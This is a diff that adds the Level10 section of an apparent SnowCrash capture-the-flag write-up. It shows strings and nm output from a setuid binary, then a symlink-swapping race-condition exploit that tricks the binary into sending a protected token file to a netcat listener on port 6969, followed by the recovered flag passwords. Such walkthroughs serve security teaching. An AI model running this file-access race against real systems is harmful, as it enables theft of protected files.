@@ -352,3 +352,59 @@ print(\"\".join([chr(l - i) for i, l in enumerate(arg) if l - i > 0]))
 
 After that we have to log with `flag09` and give the password `s5cAJpM8ev6XHw998pRWG728z`.
 When we are connected we just have to use `getflag`.
+## Level10
+
+```bash
+level10@SnowCrash:~$ strings level10
+	[...]
+	%s file host
+	sends file to host if you have access to it
+  Connecting to %s:6969 ..
+  Unable to connect to host %s
+  .*( )*.
+  Unable to write banner to host %s
+  Connected!
+  Sending file ..
+  Damn. Unable to open file
+  Unable to read from file: %s
+  wrote file!
+  You don't have access to %s
+	[...]
+```
+
+After using `nm` we can find the function `access`.
+
+```bash
+level10@SnowCrash:~$ nm -u level10
+         w _Jv_RegisterClasses
+         U __errno_location@@GLIBC_2.0
+         w __gmon_start__
+         U __libc_start_main@@GLIBC_2.0
+         U __stack_chk_fail@@GLIBC_2.4
+         U access@@GLIBC_2.0
+         U connect@@GLIBC_2.0
+         U exit@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+         U htons@@GLIBC_2.0
+         U inet_addr@@GLIBC_2.0
+         U open@@GLIBC_2.0
+         U printf@@GLIBC_2.0
+         U puts@@GLIBC_2.0
+         U read@@GLIBC_2.0
+         U socket@@GLIBC_2.0
+         U strerror@@GLIBC_2.0
+         U write@@GLIBC_2.0
+```
+We gonna used a race condition exploit.
+
+```bash
+level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done &
+level10@SnowCrash:~$ while true; do ./level10 /tmp/exploit 192.168.1.30; done
+# Open a second terminal
+level10@SnowCrash:~$ nc -lk 6969
+```
+
+After a moment you can find this message `woupa2yuojeeaaed06riuj63c`.
+
+After that we have to log with `flag10` and give the password `woupa2yuojeeaaed06riuj63c`.
+When we are connected we just have to use `getflag`.
